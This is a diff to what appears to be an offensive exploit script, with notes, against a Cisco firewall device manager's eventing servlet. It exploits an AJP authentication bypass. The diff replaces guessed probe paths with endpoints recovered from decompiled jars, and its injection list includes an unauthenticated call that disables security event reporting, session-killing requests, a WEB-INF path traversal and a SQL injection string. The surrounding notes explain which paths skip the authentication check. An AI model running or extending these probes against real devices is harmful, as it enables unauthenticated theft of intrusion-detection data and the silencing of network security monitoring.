@@ -37,12 +37,24 @@ Content negotiation bug (secondary):
   Only requests with Host header alone (no Accept) produce valid routing responses.
   Not security-exploitable but masks the endpoint from standard scanners and browsers.
 
-eStreamer background:
-  Cisco eStreamer (Event Streamer) is a proprietary binary protocol (port 8302/TCP
-  by default) used between FTD/FMC for real-time event replication. NGFWEventingApplication
-  appears to be a REST frontend to the eStreamer pipeline, confirmed by:
-    - /eventing/api/v1/eStreamer → 200 (same error pattern)
-    - SensorQueryServerRequestHandler delegation in servlet routing
+Actual endpoint map (static analysis, sensor.jar + eventing-bridge.jar):
+  NGFWEventingApplication extends HttpServlet — not a Spring MVC controller.
+  Spring Security springSecurityFilterChain is on /* but the AJP bypass causes
+  remote_addr=127.0.0.1, which FDM's NgfwWebSecurityConfigurer treats as internal.
+
+  Dispatcher prefix routing after /eventing/ strip (target.substring(9)):
+    /api/analyze/events/Eventquery/query.json → SensorRealTimeRequestDispatcher
+    /api/analyze/events/getReportConfigs      → handleReportConfigRequest (report schema)
+    /api/analyze/events/disableReports        → handleReportConfigRequest (STATE CHANGE)
+    /api/<anything>/detaildata                → CompositeReportQueryData (SQL join)
+    /api/<anything else>                      → ReportingRequestHandler (SQL query)
+    /eventadmin/updateFieldCache.json         → handleUpdateFieldMap (cache invalidation)
+    /eventadmin/removeSession.json            → handleRemoveSession (kill session by ID)
+
+  AUTH constants (SensorQueryServerRequestHandler):
+    AUTH_ENABLED_TARGET_PREFIX  = "/eventing/"   (FDM expects this to be protected)
+    AUTH_BYPASS_TARGET_PREFIX   = "/eventadmin/" (explicitly unprotected)
+    After /eventing/ prefix strip, /api/* paths fall through auth check → bypass
 
 Severity: HIGH (FMC-managed), MEDIUM (standalone FDM)
   FMC-managed: unauth read of full IDS event stream = critical information disclosure.
@@ -159,30 +171,45 @@ def send_ajp_request(host: str, port: int, method: str, uri: str,
     return result
 
 
+# Real endpoint paths (confirmed via static analysis of SensorQueryServerRequestHandler
+# and ReportsUIDispatcher decompilation from sensor.jar):
+#
+# URL routing: /eventing/api/<X> → strip /eventing (9 chars) → /api/<X>
+#   → ReportsUIDispatcher (prefix /api/) strips /api/ → target = <X>
+#   → checks: contains "analyze/events/Eventquery/query.json" → SensorRealTimeRequestDispatcher
+#   → checks: equalsIgnoreCase "analyze/events/getReportConfigs" → handleReportConfigRequest
+#   → checks: equalsIgnoreCase "analyze/events/disableReports" → handleReportConfigRequest
+#   → contains "detaildata" → CompositeReportQueryData
+#   → else → ReportingRequestHandler → SQL query
+
 PROBE_PATHS = [
-    '/eventing/api/v1/',
-    '/eventing/api/v1/events',
-    '/eventing/api/v1/subscriptions',
-    '/eventing/api/v1/status',
-    '/eventing/api/v1/version',
-    '/eventing/api/v1/eStreamer',
-    '/eventing/api/v1/session',
-    '/eventing/api/v1/config',
-    '/eventing/api/v1/intrusion',
-    '/eventing/api/v1/connection',
-    '/eventing/api/v1/threats',
-    '/eventing/api/v1/events?type=intrusion&limit=100',
-    '/eventing/api/v1/events?type=connection&start=0&limit=100',
+    # Real-time IDS/IPS event query (SensorRealTimeRequestDispatcher)
+    '/eventing/api/analyze/events/Eventquery/query.json',
+    # Report configuration enumeration
+    '/eventing/api/analyze/events/getReportConfigs',
+    # STATE-CHANGE: disables security event reporting on the FTD
+    '/eventing/api/analyze/events/disableReports',
+    # Historical event detail data (SQL-backed)
+    '/eventing/api/analyze/events/detaildata',
+    # Admin operations (AUTH_BYPASS_TARGET_PREFIX = "/eventadmin/")
+    # path: /eventing/eventadmin/<X> → strip 9 chars → /eventadmin/<X>
+    '/eventing/eventadmin/updateFieldCache.json',
+    '/eventing/eventadmin/updateFieldCache.json?cacheNames=events,connections,intrusions',
+    '/eventing/eventadmin/removeSession.json',
+    # v1/* paths hit catch-all error handler (returned in AJP probe)
+    '/eventing/api/analyze/events/Eventquery/query.json?type=intrusion',
+    '/eventing/api/analyze/events/Eventquery/query.json?type=connection',
 ]
 
 INJECTION_PATHS = [
     # Path traversal via path suffix (reflected in id field)
-    '/eventing/api/v1/../../../etc/passwd',
-    '/eventing/api/v1/events?id=\x00',
-    '/eventing/api/v1/events?filter=*',
-    # eStreamer command injection probes
-    '/eventing/api/v1/eStreamer;cmd=info',
-    '/eventing/api/v1/events?filter=1+OR+1=1',
+    '/eventing/api/analyze/../../WEB-INF/web.xml',
+    '/eventing/api/analyze/events/Eventquery/query.json?filter=1+OR+1%3D1',
+    # removeSession with arbitrary session ID
+    '/eventing/eventadmin/removeSession.json?sessionId=1',
+    '/eventing/eventadmin/removeSession.json?sessionId=test',
+    # disableReports via GET (state change, no auth)
+    '/eventing/api/analyze/events/disableReports?confirm=true',
 ]
 
 
